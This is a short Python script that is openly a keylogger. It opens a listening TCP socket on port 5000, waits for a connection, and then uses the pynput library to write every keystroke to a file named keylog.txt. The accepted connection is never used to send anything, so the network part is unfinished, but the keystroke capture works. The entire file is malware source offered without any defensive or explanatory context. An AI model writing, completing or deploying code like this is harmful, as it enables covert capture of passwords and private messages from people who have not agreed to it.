import socket
from pynput import keyboard

HOST = '0.0.0.0'  # Listen on all available network interfaces
PORT = 5000       # Port to listen on
l="keylog.txt"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

print(f"Server listening on {HOST}:{PORT}...")

conn, addr = server.accept()
print(f"Connected by {addr}")


def on_press(key):
    try:
        with open(l, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f" [{key}] \n")
    except Exception as e:
        print(f"Error: {e}")

with keyboard.Listener(on_press = on_press) as liste:
    liste.join()